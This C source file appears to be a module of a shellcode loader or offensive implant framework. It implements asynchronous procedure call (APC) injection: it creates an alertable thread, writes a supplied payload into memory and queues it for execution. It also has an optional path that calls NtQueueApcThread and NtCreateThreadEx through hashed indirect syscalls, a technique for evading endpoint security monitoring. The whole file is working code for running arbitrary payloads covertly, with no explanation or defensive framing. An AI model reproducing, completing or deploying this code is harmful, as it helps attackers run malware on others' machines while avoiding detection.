#include "injectors.h"

DWORD AlertableFunction() {
    HANDLE hEvent1 = NULL;
    HANDLE hEvent2 = NULL;


    hEvent1 = CreateEvent(NULL, FALSE, FALSE, NULL);
    hEvent2 = CreateEvent(NULL, FALSE, FALSE, NULL);

    if (hEvent1 && hEvent2) {
        SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
    }

    // Ensure the thread remains alertable for APC execution
    while (TRUE) {
        SleepEx(INFINITE, TRUE);  // Forces execution of queued APCs
    }

    if (hEvent1) CloseHandle(hEvent1);
    if (hEvent2) CloseHandle(hEvent2);

    return 0;
}


static BOOL RunViaApcInjection(HANDLE hThread, PVOID pPayload, SIZE_T sPayloadSize) {
    PVOID pAddress = NULL;

    if (!payload_loading(&pAddress, pPayload, sPayloadSize)) {
        DebugPrint("[!] Payload Loading Failed...\n");
        return FALSE;
    }

    DebugPrint("[i] QueueUserAPC with payload located at: 0x%p\n", (ULONG_PTR)pAddress);

#ifdef HW_INDIRECT_SYSCALL
    NTSTATUS		STATUS = STATUS_SUCCESS;

    // executing the payload via NtQueueApcThread
    NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)PrepareSyscallHash(NtQueueApcThread_JOAA);
    if ((STATUS = pNtQueueApcThread(hThread, pAddress, NULL, NULL, 0)) != 0) {
        DebugPrint("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
        return FALSE;
    }
    DebugPrint("[+] DONE \n");
#else
    if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)pAddress, hThread, (ULONG_PTR)NULL)) {
        DebugPrint("\t[!] QueueUserAPC Failed With Error: %d \n", GetLastError());
        VirtualFree(pAddress, 0, MEM_RELEASE);
        return FALSE;
    }
#endif
    SleepEx(10, FALSE);

    return TRUE;
}

BOOL ApcInjection(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, SIZE_T sPayloadSize) {
    DWORD dwThreadId = 0;

#ifdef HW_INDIRECT_SYSCALL
    if (hProcess == NULL) {
        hProcess = NtCurrentProcess();
    }

    NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)PrepareSyscallHash(NtCreateThreadEx_JOAA);
    NTSTATUS status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, &AlertableFunction, NULL, FALSE, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS) {
        DebugPrint("[!] NtCreateThreadEx Failed With Error : %d \n", status);
        return FALSE;
    }
#else
    hThread = CreateThread(NULL, 0, &AlertableFunction, NULL, 0, &dwThreadId);
    if (hThread == NULL) {
        DebugPrint("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
#endif

    DebugPrint("[+] Alertable Target Thread Created With Id : %d \n", dwThreadId);
    DebugPrint("[i] Running Apc Injection Function ... \n");

    if (!RunViaApcInjection(hThread, pPayload, sPayloadSize)) {
        CloseHandle(hThread);
        return FALSE;
    }

    CloseHandle(hThread);

    DebugPrint("[+] APC Injection Successful \n");

    return TRUE;
}
